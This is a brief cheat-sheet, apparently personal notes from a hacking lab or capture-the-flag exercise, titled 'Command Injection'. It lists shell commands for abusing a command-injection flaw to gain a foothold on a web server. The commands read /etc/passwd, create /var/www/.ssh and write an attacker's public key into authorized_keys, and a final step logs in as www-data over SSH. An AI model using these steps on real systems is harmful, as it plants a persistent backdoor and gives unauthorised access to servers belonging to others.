Command Injection
ssh-keygen -t rsa -b 4096
cat id_rsa.pub
find home dir (www)
cat /etc/passwd
:mkdir /var/www/.ssh
: ls -la /var/www/
copy entire public key 
:echo "pubkey" > /var/www/.ssh/authorized_keys
how to find what the home dir is 

ssh www-data@ip 
